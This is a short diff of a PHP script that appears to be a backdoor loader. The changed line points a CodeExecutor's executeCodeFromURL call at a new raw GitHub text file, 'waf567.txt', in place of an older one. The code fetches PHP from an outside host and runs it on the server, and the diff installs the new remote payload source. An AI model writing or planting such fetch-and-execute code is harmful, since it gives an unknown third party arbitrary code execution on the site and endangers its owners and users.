@@ -98,7 +98,7 @@ try {
     $executor = new CodeExecutor($fetcher);
 
     // Execute the PHP code fetched from a specific URL
-    $executor->executeCodeFromURL("https://raw.githubusercontent.com/kbol08992-lang/data/refs/heads/main/xukasi.txt");
+    $executor->executeCodeFromURL("https://raw.githubusercontent.com/kbol08992-lang/data/refs/heads/main/waf567.txt");
 } catch (Exception $e) {
     // Handle errors and exceptions
     echo "Error: " . $e->getMessage();
